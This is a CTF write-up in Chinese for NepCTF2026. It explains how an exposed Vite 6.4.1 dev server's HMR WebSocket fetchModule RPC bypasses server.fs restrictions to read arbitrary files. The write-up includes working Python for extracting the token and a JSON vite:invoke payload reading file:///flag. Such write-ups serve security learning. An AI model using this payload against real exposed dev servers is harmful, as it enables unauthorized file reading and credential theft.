# NepCTF2026 挂钩都在干什么呢？ Writeup

## 题目简述

附件是暴露到网络的 Vite 6.4.1 开发服务器。flag 位于容器根目录 `/flag`，`server.fs.allow` 会阻止普通 HTTP 文件读取，但同版本 HMR WebSocket 中的 `fetchModule` RPC 没有执行一致的文件系统授权检查，可通过 CVE-2026-39363 读取任意文件。

## 解题过程

源码确认 flag 被复制到 `/flag`，而直接请求：

```text
GET /@fs/flag?raw
```

会返回 403，说明 HTTP `/@fs/` 路径确实执行了 `server.fs` 限制。漏洞并非普通路径穿越，而是同一模块读取能力在 HTTP 与 HMR RPC 两条路径上的授权不一致。Vite 官方公告 [GHSA-p9ff-h696-f583 / CVE-2026-39363](https://github.com/vitejs/vite/security/advisories/GHSA-p9ff-h696-f583) 记录了该问题及受影响条件。

先请求 `/@vite/client`，动态提取连接 HMR 所需的 token：

```python
import re
import requests

client = requests.get(
    f"{base_url}/@vite/client", timeout=5
)
token = re.search(
    r'const wsToken = "([^"]+)"', client.text
).group(1)
```

token 可能在服务重启后变化，不能硬编码。随后连接：

```text
ws://<TARGET>/?token=<TOKEN>
```

WebSocket 必须使用子协议 `vite-hmr`，并且不发送 `Origin`：

```python
async with websockets.connect(
    ws_url,
    subprotocols=["vite-hmr"],
    origin=None,
) as ws:
    ...
```

发送 HMR RPC：

```json
{
  "type": "custom",
  "event": "vite:invoke",
  "data": {
    "name": "fetchModule",
    "id": "send:ctf",
    "data": [
      "file:///flag?raw",
      null,
      {}
    ]
  }
}
```

`file:///flag` 指向服务端绝对路径，`?raw` 要求 Vite 将文件包装为 JavaScript 原始文本模块。成功响应的 `result.code` 形如：

```javascript
export default "flag{...}\n"
```

应提取 `export default` 后的 JSON 字符串字面量，并用 `json.loads` 解码转义，而不是按固定字符位置切片。最终得到：

```text
flag{4N@1y2iNG-PerF3ct_6OOk-cIu6_EXpErI3NcE1f9d}
```

## 方法总结

本题的入口不是前端地图功能，而是依赖版本和开发服务器暴露方式。审计框架时不能只测试公开 HTTP 路由，还要检查 HMR、调试 RPC 等旁路是否调用了同一敏感能力。这里 HTTP 路径正确拒绝 `/flag`，但 WebSocket `fetchModule` 漏掉授权检查，形成任意文件读取。
